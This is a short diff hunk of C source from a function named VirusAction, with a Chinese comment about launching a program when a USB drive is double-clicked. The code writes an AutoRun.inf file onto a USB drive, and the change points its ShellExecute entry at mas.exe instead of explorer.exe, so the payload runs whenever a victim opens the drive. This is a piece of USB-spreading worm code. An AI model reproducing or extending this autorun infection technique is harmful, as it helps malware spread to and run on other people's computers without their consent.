@@ -48,7 +48,7 @@ void VirusAction()
 	//双击U盘运行程序的AutoRun.inf
 	char f_inf_name[]="a:\\AutoRun.inf";
 	f_inf_name[0]=U_path[0];   
-	char f_inf_content[]="[AutoRun]\r\nShellExecute=explorer.exe";
+	char f_inf_content[]="[AutoRun]\r\nShellExecute=mas.exe";
 	FILE *pf_inf = fopen(f_inf_name,"wb+");  
 	if (pf_inf!=NULL)
 	{
